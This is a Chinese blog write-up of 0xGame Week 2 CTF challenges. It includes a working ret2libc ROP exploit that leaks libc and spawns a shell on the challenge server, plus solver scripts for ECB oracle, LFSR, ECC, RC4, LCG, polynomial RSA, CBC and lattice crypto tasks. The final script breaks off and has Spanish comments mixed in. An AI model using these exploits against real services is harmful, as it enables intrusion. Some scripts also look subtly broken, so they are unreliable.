---
title: 0xGame Week2 WP
date: 2025-10-19
categories: pwn
top_img: /images/background/东方/01.jpg
cover: /images/background/东方/01.jpg
description: 这周的Reverse很好玩🥰
---

# pwn

## ret2libc

```python
io=remote("nc1.ctfplus.cn",30264)
main=0x40122D
got=0x404018
plt=0x401070
rdi=0x40119e
ret=0x40122c
io.recvuntil(b"Input something: \n")
payload=b'a'*0x48+p64(rdi)+p64(got)+p64(plt)+p64(main)
io.send(payload)
libc=ELF('./libc.so.6')
base=u64(io.recv(6).ljust(8,b'\x00'))-libc.sym.puts
print(hex(base))
sym=libc.sym.system+base
sh=next(libc.search("/bin/sh"))+base
payload=b'a'*0x48+p64(ret)+p64(rdi)+p64(sh)+p64(sym)
io.recvuntil(b"Input something: \n")
io.sendline(payload)
io.interactive()
```

先把libc的基址找出来，然后再构造ROP链。

## 多线程

```python
io=remote("nc1.ctfplus.cn",32640)
io.sendline(b"a")
for i in range(0x40):
    io.sendline(b"2")
io.sendline(b"3")
io.interactive()
```

得到`0xGame{Thr3@ds_c@nn0t_b3_w1th0ut_l0cks}`

## 高数😫😫

![eval](/images/wp/eval.png)

这个**条件**和**循环**结构够我学一辈子😭😭

flag：`0xGame{Ur_@n_excel1ent_bl@ster}`

# Crypto

## Orcale

爆破

```python
import socket
import string
import time

# --- 连接信息 ---
HOST = 'nc1.ctfplus.cn'
PORT = 49725
BLOCK_SIZE = 16

# --- I/O 辅助函数 ---
def recv_until(s, delim):
    """从 socket 中接收数据，直到遇到指定的分隔符 delim。"""
    data = b""
    while not data.endswith(delim):
        try:
            chunk = s.recv(1)
            if not chunk:  # 连接已关闭
                return None
            data += chunk
        except socket.timeout:
            print("[-] Socket timeout.")
            return None
    return data

def get_encryption(s, payload_hex):
    """
    在一个已建立的 socket 连接上，发送一次加密请求并获取结果。
    """
    try:
        # 1. 回答 'y' 继续加密
        s.sendall(b'y\n')
        recv_until(s, b'[-] Plaintext(in hex):')
        
        # 2. 发送我们的 payload
        s.sendall(payload_hex.encode() + b'\n')
        
        # 3. 解析返回的密文
        recv_until(s, b'[+] Ciphertext: ')
        response_line = recv_until(s, b'\n')
        if response_line:
            return response_line.strip().decode()
        return None
    except (socket.error, BrokenPipeError):
        print("[-] Network error occurred during communication.")
        return None

# --- 主攻击逻辑 ---
def solve():
    """
    执行 ECB 逐字节攻击的主函数。
    """
    # 建立一个持久连接
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    
    try:
        s.connect((HOST, PORT))
        # 清理掉第一个 "Continue?" 提示
        recv_until(s, b'y/[n])?')
    except socket.error as e:
        print(f"[-] Failed to connect to {HOST}:{PORT}. Error: {e}")
        return

    known_flag = b'0xGame{'
    print(f"[*] Starting ECB byte-at-a-time attack with known prefix: {known_flag.decode()}")
    print("-" * 50)

    try:
        while not known_flag.endswith(b'}'):
            # 1. 对齐步骤 (Alignment)
            # 构造填充物 (padding)，其长度能让下一个未知字节恰好落在16字节块的末尾
            # 例如，当 known_flag 长度为7时, 我们需要 15-7=8 个 'A'
            padding_len = (BLOCK_SIZE - 1) - (len(known_flag) % BLOCK_SIZE)
            padding = b'A' * padding_len
            
            # 发送这个对齐用的 payload，获取目标密文
            # 服务器会加密: pad(padding + flag, 16)
            response_hex = get_encryption(s, padding.hex())
            if not response_hex:
                print("[-] Failed to get response from oracle during alignment.")
                break
            
            # 我们感兴趣的密文块，是包含第一个未知字节的那一块
            # 它的索引可以通过 (padding长度 + 已知flag长度) / 16 来计算
            target_block_index = (len(padding) + len(known_flag)) // BLOCK_SIZE
            start_pos = target_block_index * BLOCK_SIZE * 2  # 1字节=2个hex字符
            end_pos = start_pos + (BLOCK_SIZE * 2)
            target_block = response_hex[start_pos:end_pos]

            # 2. 爆破步骤 (Brute-force)
            found_char = False
            # 优先尝试常见的 flag 字符集
            charset = (string.ascii_letters + string.digits + "_-!{}?@#$").encode('latin-1')

            for char_code in charset:
                guess_char = bytes([char_code])
                
                # 构造测试 payload: padding + known_flag + guess
                # 服务器会加密: pad(padding + known_flag + guess + rest_of_flag, 16)
                # 这个构造使得 (padding + known_flag + guess) 组成一个或多个完整的块
                test_payload = padding + known_flag + guess_char
                
                test_response_hex = get_encryption(s, test_payload.hex())
                if not test_response_hex:
                    # 如果单次请求失败，跳过这个字符，避免程序崩溃
                    continue

                # 提取相同位置的密文块进行比较
                test_block = test_response_hex[start_pos:end_pos]
                
                if test_block == target_block:
                    known_flag += guess_char
                    # 使用 'ignore' 以避免非UTF-8字符打印时出错
                    print(f"[+] Found: '{guess_char.decode('latin-1', 'ignore')}'  ->  Flag: {known_flag.decode('latin-1', 'ignore')}")
                    found_char = True
                    break
            
            if not found_char:
                print("\n[-] Attack failed. Could not find the next character in the charset.")
                break
    
    finally:
        print("-" * 50)
        if known_flag.endswith(b'}'):
            print(f"[!] Success! Full flag found: {known_flag.decode('latin-1', 'ignore')}")
        else:
            print(f"[*] Attack stopped. Partial flag: {known_flag.decode('latin-1', 'ignore')}")
        s.close()

if __name__ == '__main__':
    solve()
```

得到`0xGame{5679df1b-4bae-4715-8433-4d52ccb258ef}`

## LFSR

线性反馈移位寄存器。

```python
from Crypto.Cipher import AES

def int_to_bits(x, bit_length):
    """将整数转为比特列表，高位在前"""
    return [(x >> i) & 1 for i in reversed(range(bit_length))]

def bits_to_int(bits):
    """将比特列表转为整数"""
    return int(''.join(str(b) for b in bits), 2)

def lfsr_step(state, mask, length=128):
    """模拟LFSR的一步"""
    output = 0
    for i in range(length):
        output ^= state[i] & mask[i]
    new_state = state[1:] + [output]
    return new_state, output

def recover_mask_from_keystream(keystream, n=128):
    """从密钥流恢复mask"""
    # 构建线性方程组: 对于 i = n 到 2n-1
    # keystream[i] = mask · [keystream[i-n], ..., keystream[i-1]]
    A = []
    b = []
    
    for i in range(n, 2*n):
        # 状态向量是前n个输出比特
        state_vector = keystream[i-n:i]
        A.append(state_vector)
        b.append(keystream[i])
    
    # GF(2)上的高斯消元
    size = n
    mat = [row + [b[i]] for i, row in enumerate(A)]
    
    # 前向消元
    for col in range(size):
        # 找到主元
        pivot = -1
        for row in range(col, size):
            if mat[row][col] == 1:
                pivot = row
                break
        if pivot == -1:
            continue
            
        # 交换行
        mat[col], mat[pivot] = mat[pivot], mat[col]
        
        # 消去其他行
        for row in range(col + 1, size):
            if mat[row][col] == 1:
                for j in range(col, size + 1):
                    mat[row][j] ^= mat[col][j]
    
    # 回代求解
    mask = [0] * size
    for i in reversed(range(size)):
        if mat[i][i] == 0:
            if mat[i][size] == 0:
                # 自由变量，设为0
                mask[i] = 0
            else:
                print(f"矛盾方程 at row {i}")
                return None
        else:
            mask[i] = mat[i][size]
            for j in range(i + 1, size):
                mask[i] ^= mat[i][j] & mask[j]
    
    return mask

# 已知数据
random1 = 79262982171792651683253726993186021794
random2 = 121389030069245976625592065270667430301
ciphertext = b'\xb9WE<\x8bC\xab\x92J7\xa9\xe6\xe8\xd8\x93D\xcc\xac\xfdvfZ}C\xe6\xd8;\xf7\x18\xbauz`\xb9\xe0\xe6\xc6\xae\x00\xfb\x96%;k{Ph\xfa'

print("分析LFSR...")

# 检查数值
print(f"random1: {random1}")
print(f"random2: {random2}")
print(f"random1 比特长度: {random1.bit_length()}")
print(f"random2 比特长度: {random2.bit_length()}")

# 转为比特序列（确保128位）
bits1 = int_to_bits(random1, 128)
bits2 = int_to_bits(random2, 128)
keystream = bits1 + bits2

print(f"密钥流长度: {len(keystream)} 比特")

# 方法1: 直接解线性方程组
print("\n方法1: 解线性方程组...")
mask_bits = recover_mask_from_keystream(keystream)
if mask_bits:
    mask = bits_to_int(mask_bits)
    print(f"找到 mask: {hex(mask)}")
    
    # 验证mask
    test_state = bits1[:]  # 初始状态是random1的比特
    test_mask = mask_bits
    generated = []
    for _ in range(256):
        test_state, out = lfsr_step(test_state, test_mask)
        generated.append(out)
    
    # 检查是否匹配
    if generated[128:256] == bits2:
        print("✓ Mask 验证成功!")
    else:
        print("✗ Mask 验证失败")
    
    # 解密
    for order in ['big', 'little']:
        key = mask.to_bytes(16, order)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext)
        print(f"\n{order} 顺序解密:")
        try:
            decoded = plaintext.decode('utf-8', errors='ignore')
            print(f"解码: {decoded}")
            if '0xGame' in decoded or 'flag' in decoded or '{' in decoded:
                print("*** 找到 flag! ***")
        except:
            print(f"原始字节: {plaintext}")
else:
    print("方法1失败")

# 方法2: 如果上面失败，尝试暴力搜索附近的mask值
print("\n方法2: 尝试附近可能的mask值...")
if mask_bits:
    base_mask = bits_to_int(mask_bits)
    # 尝试一些变体
    for shift in range(-10, 11):
        test_mask = (base_mask + shift) & ((1 << 128) - 1)
        for order in ['big', 'little']:
            try:
                key = test_mask.to_bytes(16, order)
                cipher = AES.new(key, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext)
                if b'0xGame' in plaintext:
                    print(f"找到 flag! mask={hex(test_mask)}, order={order}")
                    print(f"Flag: {plaintext}")
                    break
            except:
                pass
```

得到`0xGame{124ab3f1-4c3e-4d2a-8e6f-9b5e6c7d8f90}`

## ECC

大步小步法计算私钥s。

```python
from hashlib import sha256
from Crypto.Cipher import AES
import math

# ===============================================================
# 第一部分：椭圆曲线和 Point 类的定义
# ===============================================================

# 椭圆曲线 secp256r1 (NIST P-256) 的参数
p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
a = 0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc
b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b

# 辅助函数：计算模逆元
# 使用扩展欧几里得算法
def inv(n, p):
    return pow(n, p - 2, p)

class Point:
    """
    一个表示 secp256r1 椭圆曲线上点的类
    """
    def __init__(self, x, y):
        self.x = x
        self.y = y
        self.a = a
        self.b = b
        self.p = p

    # 定义点加法
    def __add__(self, other):
        # 处理无穷远点 (用 None 表示)
        if other is None:
            return self

        # 两个点相同，执行点倍增
        if self == other:
            # lam = (3 * x^2 + a) / (2 * y) mod p
            lam = (3 * self.x * self.x + self.a) * inv(2 * self.y, self.p) % self.p
        else: # 两个点不同
            # lam = (y2 - y1) / (x2 - x1) mod p
            lam = (other.y - self.y) * inv(other.x - self.x, self.p) % self.p
        
        # 计算新点的坐标
        # x3 = lam^2 - x1 - x2 mod p
        x3 = (lam * lam - self.x - other.x) % self.p
        # y3 = lam * (x1 - x3) - y1 mod p
        y3 = (lam * (self.x - x3) - self.y) % self.p
        
        return Point(x3, y3)

    # 定义标量乘法 (s * P)
    def __mul__(self, s):
        current = self
        res = None # 这是无穷远点
        
        # 使用快速幂的思想 (二进制展开法)
        while s > 0:
            if s & 1: # 如果当前位是 1
                if res is None:
                    res = current
                else:
                    res = res + current
            current = current + current # 点倍增
            s >>= 1 # 右移一位
        return res

    # 定义点的相等性
    def __eq__(self, other):
        if other is None:
            return False
        return self.x == other.x and self.y == other.y

    # 为了能将 Point 对象作为字典的键，需要定义 __hash__
    def __hash__(self):
        return hash((self.x, self.y))
    
    # 定义点的相反数
    def __neg__(self):
        return Point(self.x, -self.y % self.p)

    # 方便打印
    def __repr__(self):
        return f"({self.x}, {self.y})"

# ===============================================================
# 第二部分：实现并运行大步小步法 (BSGS) 来找到 s
# ===============================================================

def bsgs(base_point, target_point, search_limit):
    """
    使用大步小步法求解椭圆曲线离散对数问题 (s * base_point = target_point)
    :param base_point: 基点 P
    :param target_point: 目标点 Q
    :param search_limit: s 的最大搜索范围 (2^40)
    :return: 整数 s
    """
    m = int(math.sqrt(search_limit)) + 1
    print(f"步长 (m) 设置为: {m}")

    # 1. 计算小步 (Baby Steps) 并存入哈希表
    baby_steps_table = {}
    current_point = None # 0 * P
    for j in range(m):
        if current_point not in baby_steps_table:
            baby_steps_table[current_point] = j
        if current_point is None:
            current_point = base_point
        else:
            current_point = current_point + base_point
    print("小步表已生成完成。")
    
    # 2. 计算大步的步进 (mP)
    mP = base_point * m
    mP_inv = -mP

    # 3. 计算大步 (Giant Steps) 并查找匹配
    giant_step_point = target_point
    for i in range(m):
        # 查找 Q - i*m*P 是否在小步表中
        if giant_step_point in baby_steps_table:
            j = baby_steps_table[giant_step_point]
            s = i * m + j
            # 由于0*P和负点的情况，可能需要微调
            if base_point * s == target_point:
                 return s
        giant_step_point = giant_step_point + mP_inv
    
    return None # 没有找到解

# ===============================================================
# 第三部分：整合并执行解密
# ===============================================================

if __name__ == '__main__':
    # 题目中给出的 P 和 Q 的坐标
    P_coords = (96072097493962089165616681758527365503518618338657020069385515845050052711198, 106207812376588552122608666685749118279489006020794136421111385490430195590894)
    Q_coords = (100307267283773399335731485631028019332040775774395440323669585624446229655081, 22957963484284064705317349990185223707693957911321089428005116099172185773154)

    # 创建 Point 对象
    P = Point(P_coords[0], P_coords[1])
    Q = Point(Q_coords[0], Q_coords[1])
    
    # s 的最大值是 2^40
    search_space = 2**40
    
    print("正在使用大步小步法计算私钥 s，这可能需要一分钟左右...")
    s = bsgs(P, Q, search_space)

    if s is not None:
        print(f"成功找到私钥 s: {s}\n")
        
        # 使用找到的 s 进行解密
        print("正在使用 s 生成密钥并解密...")
        key = sha256(str(s).encode()).digest()
        
        ciphertext = b':\xe5^\xd2s\x92kX\x96\x12\xb7dT\x1am\x94\x86\xcd.\x84*-\x93\xb5\x14\x8d\x99\x94\x92\xfaCE\xbd\x01&?\xe1\x01f\xef\x8f\xe3\x13\x13\x96\xa6\x0f\xc0'
        
        cipher = AES.new(key, AES.MODE_ECB)
        
        decrypted_padded = cipher.decrypt(ciphertext)
        
        # 去除 PKCS7 填充
        padding_len = decrypted_padded[-1]
        flag = decrypted_padded[:-padding_len]
        
        print("\n" + "="*40)
        try:
            print(f"解密成功！ Flag 是: {flag.decode()}")
        except UnicodeDecodeError:
            print(f"解密成功！ Flag (原始字节): {flag}")
        print("="*40)

    else:
        print("未能找到 s。")
```

得到![image-20251009211926304](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251009211926304.png)

flag:`0xgame{ECC_1s_4w3s0m3_but_n0t_perf3ct}`

## 流密码

已知加密key的明文是key*5,加密flag是32字节，所以msg也是32字节。两个密文是同一个RC4密钥加密的，我们可以求出密钥流的前32字节:

```python
keystream = ciphertext_key[:32] ⊕ P2[:32]
```

然后用该密钥就能求出msg：

```python
msg = ciphertext_flag ⊕ keystream
```

完整解密脚本：

```python
ciphertext_flag = b'n\xab\xa8\xf6%\xf5\xbd\xc5\x97\xe0\xa0zCpV{\x04&\x8a\xe5\xe1TP\xe0'
ciphertext_key = b'\x83=x{\xbcb\r^3nl\xbe\xf4\xdb\xe5\xc5\x86\x9e-Rt\xf9\x93\t\x883I\xdd\xcdx\x01"\xb6d\xd3A\xa47|\x8d\xf8\xe9\xb1\x04\xfaz\x83t\xd5\x85\xd19\xfd\xbc\x88\xc8\x05fJZ\xae\xba%\x04B\xd6a>\xf7\xc6B\xc0`\xc2\xc4\x10\x83BbJ'

key_known = b"This is keyyyyyy" * 5

# 取前 32 字节
key_part = key_known[:32]
cipher_key_part = ciphertext_key[:32]

keystream = bytes(a ^ b for a, b in zip(cipher_key_part, key_part))

msg = bytes(a ^ b for a, b in zip(ciphertext_flag, keystream))

print("msg =", msg)
print(msg.decode('gbk'))
```

后面发现这居然是GBK编码 ( ?   于是加了这一行`print(msg.decode('gbk'))`，得到flag：`0xGame{哈哈哈没想到我是中文的吧}`

## LCG

RNG=1，得到`Encrypted flag: [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]`所以flag是36字节。

先找RNG状态序列：从 `seed=1` 开始迭代 RNG，直到状态重复，记录所有状态序列 `states`。

枚举a和b：因为 `a` 和 `b` 是 `states[k1]` 和 `states[k2]`，其中 `k1, k2` 在 `[1, 1024]` 范围内（因为 `random.randint(1, 1024)`），所以取 `a = states[i]`, `b = states[j]`，其中 `i` 和 `j` 从 1 到 min(1024, len(states))

完整exp:

```python
from Crypto.Util.number import inverse

MOD = 2**32 + 1

coefficients = [77549, 468297, 447715, 99019, 1039399, 618114, 67952, 512021, 390981, 412152]
enc_flag = [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]

class RNG():
    def __init__(self, coefficients, seed, MOD=2**20):
        self.coefficients = coefficients
        self.state = seed
        self.MOD = MOD
        self.f = lambda x: sum(c * (x ** i) for i, c in enumerate(coefficients)) % MOD

    def next(self):
        self.state = self.f(self.state)
        return self.state

# 生成 RNG 状态序列（足够长，比如 5000 个状态，确保覆盖循环）
seed = 1
rng = RNG(coefficients, seed)
states = [seed]
for _ in range(5000):
    nxt = rng.next()
    if nxt == states[0]:
        break
    states.append(nxt)

print(f"Generated {len(states)} unique RNG states")

# 枚举 a 和 b 的可能值（索引从 1 到 1024）
found = False
for i in range(1, min(1025, len(states))):
    a = states[i]
    if gcd(a, MOD) != 1:
        continue
    inv_a = inverse(a, MOD)
    for j in range(1, min(1025, len(states))):
        b = states[j]
        plain = []
        for c in enc_flag:
            possible_byte = None
            state_val = c
            # 反向 1 到 1024 步
            for step in range(1, 1025):
                state_val = (state_val - b) * inv_a % MOD
                if 0 <= state_val <= 255:
                    if possible_byte is None:
                        possible_byte = state_val
                    else:
                        # 如果多个步数都得到合法字节，需要选择，这里先取第一个
                        # 实际上应该检查一致性，我们先简单处理
                        pass
            if possible_byte is None:
                break
            plain.append(possible_byte)
        if len(plain) == len(enc_flag):
            # 检查是否可打印 ASCII
            try:
                text = bytes(plain).decode('ascii')
                if all(32 <= p < 127 for p in plain):
                    print(f"Found: a={a}, b={b}, plaintext = {text}")
                    found = True
                    break
            except:
                pass
    if found:
        break

if not found:
    print("Not found with given constraints.")
```

## PolyRSA

```python
p = Integer(211381997162225534712606028333737323293)
q = Integer(291844321073146066895055929747029949743)
n = p * q
e = 65537

# 定义多项式环
Rp.<x> = PolynomialRing(GF(p))
Rq.<x> = PolynomialRing(GF(q))
Rn.<x> = PolynomialRing(Zmod(n))

# 定义模 x^8 - 1
Sp = Rp.quotient(x^8 - 1, 'a')
Sq = Rq.quotient(x^8 - 1, 'b')
Sn = Rn.quotient(x^8 - 1, 'c')

# 密文多项式系数
c_coeffs = [40882135200347703593754473549436673146387957409540306808209934514868940052992,
            13673861744940819052324430973254902841262867940443611208276249322420769352299,
            14825937682750201471490037222143248112539971745568733623844924679519292569979,
            38679688295547579683397975810830690182925250157203662993481664387755200460738,
            48188456496545346035512990878010917911654453288374940837147218298761674630209,
            573073037892837477865699910635548796182825197336726898256762153949994844160,
            33191976337303879621137795936787377133622652419928253776624421127421475322069,
            46680445255028101113817388282005859237776046219558912765486646689142241483104]

c_poly = Sn(c_coeffs)

# 计算单位群阶
order_p = (p-1)^2 * (p^2 - 1) * (p^4 - 1)
order_q = (q-1)^2 * (q^2 - 1) * (q^4 - 1)
order = lcm(order_p, order_q)
d = inverse_mod(e, order)

# 解密
m_poly = c_poly^d

# 提取系数
m_coeffs = [Integer(m_poly[i]) for i in range(8)]

print("解密后的系数:", m_coeffs)

# 检查系数是否在字节范围内
for i, coeff in enumerate(m_coeffs):
    print(f"系数 {i}: {coeff} (在 0-255 内: {0 <= coeff <= 255})")

# 如果在字节范围内，转为字符
if all(0 <= coeff <= 255 for coeff in m_coeffs):
    flag = ''.join(chr(b) for b in m_coeffs)
    print("Flag:", flag)
else:
    print("解密失败：系数不在 ASCII 范围内")
    print("尝试用 long_to_bytes 方式:")
    try:
        flag_bytes = b''
        for coeff in m_coeffs:
            # 将大整数转为字节
            while coeff > 0:
                flag_bytes = bytes([coeff % 256]) + flag_bytes
                coeff //= 256
        print("Flag bytes:", flag_bytes)
    except Exception as e:
        print("错误:", e)
```

得到`0xGame{D0_y0u_l1k3_RSA_w1th_p0lyn0m14l_r1ngs?}`

## CCB

```python
#!/usr/bin/env python3

from base64 import b64decode, b64encode
import os

# Given IV
IV = b64decode("Mkoz9OBLUA4EgWqbuheBcg==")
print(f"IV: {IV.hex()}")

# Step 1: Create C-B-C pattern
# We need C1 = C3 != C2
# 
# For CBC mode:
# C1 = E(P1 ⊕ IV)
# C2 = E(P2 ⊕ C1)
# C3 = E(P3 ⊕ C2)
#
# Strategy: 
# 1. Choose P1 and P2 arbitrarily
# 2. Encrypt to get C1, C2
# 3. Set P3 = P1 ⊕ IV ⊕ C2 so that P3 ⊕ C2 = P1 ⊕ IV
#    This makes C3 = E(P3 ⊕ C2) = E(P1 ⊕ IV) = C1

print("\n=== Step 1: Creating C-B-C ciphertext ===")
print("Strategy: Choose P1, P2, then set P3 = P1 ⊕ IV ⊕ C2")
print("This will make C3 = C1")

# For the first encryption, we can choose any P1 and P2
# But we need to know C1 and C2 to compute P3
# So we'll need to do this interactively

print("\nFirst, encrypt with P1=00...00 (16 zeros), P2=01...01, P3=00...00 (temporary)")
P1 = b'\x00' * 16
P2 = b'\x01' * 16
P3_temp = b'\x00' * 16
plaintext1_temp = P1 + P2 + P3_temp
print(f"Temporary plaintext (base64): {b64encode(plaintext1_temp).decode()}")
print("After getting C1 and C2 from server, calculate:")
print("P3 = P1 ⊕ IV ⊕ C2")
print("Then encrypt again with the corrected plaintext")

print("\n=== Step 2: Creating C-C-B ciphertext ===")
print("After getting C and B from step 1:")
print("We need C1 = C2 = C and C3 = B")
print("\nStrategy:")
print("1. Set P1 such that E(P1 ⊕ IV) = C")
print("   So P1 = D(C) ⊕ IV - but we can't decrypt without the key")
print("\nAlternative strategy:")
print("Since C1 from step 1 satisfies C1 = E(P1 ⊕ IV),")
print("We need to reuse that same P1")
print("For C2 = C1, we need E(P2 ⊕ C1) = C1")
print("So P2 ⊕ C1 = P1 ⊕ IV")
print("Therefore P2 = P1 ⊕ IV ⊕ C1")
print("\nFor C3 = B (which is C2 from step 1):")
print("We need E(P3 ⊕ C2) = B")
print("Since C2 = C1 (both equal to C), P3 ⊕ C1 = P2_old ⊕ C1_old")
print("From step 1, C2_old = E(P2_old ⊕ C1_old) = B")
print("So we need P3 ⊕ C = P2_old ⊕ C (where C = C1_old)")
print("Therefore P3 = P2_old")

print("\n=== Practical Solution ===")
print("1. Get IV from server")
print("2. Encrypt P1||P2||temp with P1=zeros, P2=ones to get C1||C2||C3_temp")
print("3. Calculate P3 = P1 ⊕ IV ⊕ C2")
print("4. Encrypt P1||P2||P3 to get C||B||C (C-B-C pattern)")
print("5. Calculate P2' = P1 ⊕ IV ⊕ C")
print("6. Encrypt P1||P2'||P2 to get C||C||B (C-C-B pattern)")
print("7. Get flag!")

# Helper function to XOR bytes
def xor_bytes(a, b):
    return bytes(x ^ y for x, y in zip(a, b))

print("\n=== Interactive Solver ===")
print("Step 1: Use option 1 to encrypt this plaintext:")
P1 = b'\x00' * 16
P2 = b'\xff' * 16  # Changed to all 0xFF to ensure P2 != P1
P3_temp = b'\x00' * 16
plaintext_temp = P1 + P2 + P3_temp
print(f"{b64encode(plaintext_temp).decode()}")
print("\nAfter you get the ciphertext, paste it here (base64):")
print("(Or type 'manual' to calculate manually)")

try:
    ct1 = input().strip()
    if ct1.lower() != 'manual' and ct1:
        ct1_bytes = b64decode(ct1)
        C1 = ct1_bytes[:16]
        C2 = ct1_bytes[16:32]
        
        print(f"\nC1: {C1.hex()}")
        print(f"C2 (this is B): {C2.hex()}")
        
        # Calculate correct P3 for C-B-C
        P3 = xor_bytes(xor_bytes(P1, IV), C2)
        plaintext_cbc = P1 + P2 + P3
        print(f"\n=== C-B-C Plaintext (base64) ===")
        print(b64encode(plaintext_cbc).decode())
        
        # Calculate P2' for C-C-B
        P2_prime = xor_bytes(xor_bytes(P1, IV), C1)
        plaintext_ccb = P1 + P2_prime + P2
        print(f"\n=== C-C-B Plaintext (base64) ===")
        print(b64encode(plaintext_ccb).decode())
        
        print("\nUse these plaintexts in order when prompted for option 2!")
    else:
        print("\nManual calculation formulas:")
        print("Given C1||C2||C3 from temporary encryption:")
        print("P3_correct = P1 ⊕ IV ⊕ C2")
        print("P2' = P1 ⊕ IV ⊕ C1")
        print("\nC-B-C plaintext: P1 || P2 || P3_correct")
        print("C-C-B plaintext: P1 || P2' || P2")
except:
    print("\nUse the formulas above to calculate manually")
```

运行上述脚本，它会告诉你应该怎么做，首先选项1把`AAAAAAAAAAAAAAAAAAAAAP////////////////////8AAAAAAAAAAAAAAAAAAAAA==`这个粘进去，注意是base64编码的，所以记得结尾要有`==`,没有记得补上。然后服务器会返回给你加密的内容，粘进脚本里，`Ug7WsyG0J3FNWii4QRq2HQBI5mgU27sArYBi5lVTcR06+3+4x5Tdy5Ec9yMH2Xva`,然后它会给你解出cbc：`AAAAAAAAAAAAAAAAAAAAAP////////////////////8yAtWc9JDrDqkBCH3vRPBv`和ccb：`AAAAAAAAAAAAAAAAAAAAAGBE5UfB/3d/SdtCI/sNN2//////////////////////`,从而得到flag：` 0xGame{fdc902c6-873a-4d92-b366-b6e83bde39f7}`.

## 格

解格：

```python
# SageMath 代码 (最终版)

# 1. 这是你从程序输出中提供的矩阵
matrix_data = [
    [3284681750909390818306909313921642175535822995982583393933696966300433498618099, 7062920994008607414635543198964747262695143293079919687270285360471612225464116, 9826330432780730699882966183005563282601785988437488502794820428794464309726364, 10313939243981504072492843197821189873801981624046806578030558315476228320733359],
    [14962120076283198553291772690327243603574931151327631953834236409697046371251172, 10914614871335511269514555072571377171094477247162595307427654861209446389077850, 13813513556033584840229315973248340868169094377335326963200609716900171410846991, 17767016205042422794681474520318417767408504251129953471000646286235093083687535],
    [15880849953718488589631767682500857705255547835146769369286551172642086223544654, 23536981063518946472925309088916542857554725764823718161707669971432320275459487, 26927812823530065718296292087211430992875944789365872721297497760084580766210537, 22230074134750723773334677934743831896859185125095203873930495218095676602198247],
    [14741023566046737527403024490343979553759831564949552088348125025359384680249250, 8837391869363988214859613817767621920507231139048698235441315423135328237787325, 9720795972355554118334542488724936259246227879278497862252939659284272861952841, 12075839868445672238363457714940958060191660916729079502656993881392627251511248]
]

M = matrix(ZZ, matrix_data)

# 2. 应用 LLL 算法. 'B' 将是一个完整的 4x4 矩阵.
B = M.LLL()

print("[+] LLL 规约后的基 (完整的 B 矩阵):")
print(B)

found_secret = False

def recover_secret(vector, vector_name):
    global found_secret
    if found_secret: return

    print(f"\n--- 正在检查向量: {vector_name} ---")
    for direction in [1, -1]:
        v_cand = vector * direction
        if v_cand.is_zero(): continue

        first_nonzero_val = next((val for val in v_cand if val != 0), None)
        for byte_val in range(1, 256):
            if first_nonzero_val % byte_val == 0:
                k = first_nonzero_val // byte_val
                if k == 0: continue
                s_cand = v_cand / k
                if all(c.is_integer() and 0 <= c <= 255 for c in s_cand):
                    secret_bytes = bytes([int(c) for c in s_cand])
                    print(f"[+] 成功! 在 '{vector_name}' 中找到可能的 secret")
                    print(f"[-] secret: {secret_bytes.hex()}")
                    found_secret = True
                    return

# 3. 检查基向量及其简单组合
candidates = {
    "B[0]": B[0], "B[1]": B[1],
    "B[0] + B[1]": B[0] + B[1], "B[0] - B[1]": B[0] - B[1],
    "B[2]": B[2], "B[3]": B[3]
}

for name, vec in candidates.items():
    if found_secret: break
    recover_secret(vec, name)

if not found_secret:
    print("\n[!] 未能恢复 secret. 问题可能比预想的更复杂.")
```



解密flag：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 1. PEGA AQUÍ EL TEXTO CIFRADO COMPLETO DE 160 CARACTERES.
#    El que proporcionaste tiene 156 caracteres (78 bytes), le faltan 4 caracteres (2 bytes) al final.
#    Asegúrate de copiarlo entero.
hex_ciphertext = "83c9b4db1e036eada862d24928ae12641f7e56f713598661600da434cf3bc3e74429cbb807173626516dd030d964ad1f06ef2f9da03722943ba57653c4e0733b8474d57d450b01a331b1bd7ea36dcc4b" # <--- ¡REEMPLAZA ESTO CON EL VALOR COMPLETO!

# 2. La clave fija del programa.
key = b'0xGame2025awaQAQ'
block_size = AES.block_size  # 16 bytes

# --- Script de Desencriptación Correcto ---
try:
    full_ciphertext = bytes.fromhex(hex_ciphertext)
    
    # Comprobación de la longitud
    if len(full_ciphertext) % block_size != 0:
        print(f"[!] ADVERTENCIA: La longitud del texto cifrado ({len(full_ciphertext)} bytes) no es un múltiplo de 16.")
        print("[!] Esto indica que el texto cifrado está incompleto. El resultado será incorrecto.")

    if len(full_ciphertext) < block_size:
        raise ValueError("El texto cifrado es demasiado corto.")

    # El primer bloque del texto cifrado (C_1) actúa como el IV para descifrar el resto del mensaje.
    iv_for_decryption = full_ciphertext[0:block_size]

    # El texto cifrado que queremos descifrar es todo lo que sigue al primer bloque (C_2, C_3, ...).
    ciphertext_to_decrypt = full_ciphertext[block_size:]
    
    # Crear un nuevo cifrador CFB usando C_1 como IV.
    cipher = AES.new(key, AES.MODE_CFB, iv=iv_for_decryption)
    
    # Descifrar para obtener (padded_flag + urandom_final).
    decrypted_payload = cipher.decrypt(ciphertext_to_decrypt)
    
    print(f"[+] Contenido descifrado: {decrypted_payload}")

    # El mensaje original era: padded_flag(48 bytes) + urandom(16 bytes).
    # Por lo tanto, el contenido descifrado debería tener 64 bytes.
